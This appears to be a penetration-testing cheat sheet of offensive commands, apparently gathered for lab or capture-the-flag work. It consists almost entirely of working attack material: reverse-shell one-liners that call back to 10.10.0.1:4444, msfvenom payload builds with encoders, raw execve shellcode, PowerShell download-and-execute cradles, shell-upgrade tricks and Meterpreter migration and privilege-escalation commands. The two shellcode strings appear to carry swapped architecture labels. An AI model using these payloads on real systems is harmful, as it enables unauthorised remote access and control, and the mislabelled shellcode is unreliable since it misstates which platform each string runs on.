sudo python3 -m http.server 80
## Linux reverse shell

<a href="https://weibell.github.io/reverse-shell-generator/">Reverse Shell Generator</a><br>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings Cheatsheet <3</a>
```bash
bash -i >& /dev/tcp/10.10.0.1/4444 0>&1
nc -e /bin/bash 10.10.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.1 4444 >/tmp/f
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f exe > reverse.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f exe > reverse.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f elf >reverse.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f elf >reverse.elf
-e x86/shikata_ga_nai -i 25

Linux x86 /bin/sh execve
\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
Linux x64 /bin/sh execve
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80


```
## Interactive shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
/bin/sh -i

perl: exec "/bin/bash";
ruby: exec "/bin/bash"
lua: os.execute('/bin/bash')

CTRL-Z
stty raw -echo
fg
export TERM=xterm

SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm

rlwrap nc -vlnp 1234
```
## Download files
```powershell
certutil.exe -urlcache -split -f http:// .exe
iwr http:// -outfile .exe
powershell.exe IEX (New-Object Net.WebClient).DownloadFile("")
```
## Download and run powershell script
```powershell
powershell.exe IEX (New-Object Net.WebClient).DownloadString("")
IEX((New-Object Net.WebClient).DownloadString(""))
powershell.exe -e 
```
<a href="https://raikia.com/tool-powershell-encoder">Powershell Encoder</a>
  
## Powershell.exe Bit
```powershell
[Environment]::Is64BitProcess

C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe (32bit)
C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe (32bit -> 64bit)
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (64bit)
```
## Meterpreter
```
use post/windows/manage/migrate
post/windows/manage/archmigrate
run post/multi/recon/local_exploit_suggester
set AUTORUNSCRIPT multi_console_command -r /root/autoruncommands.rc
ps ; migrate
```
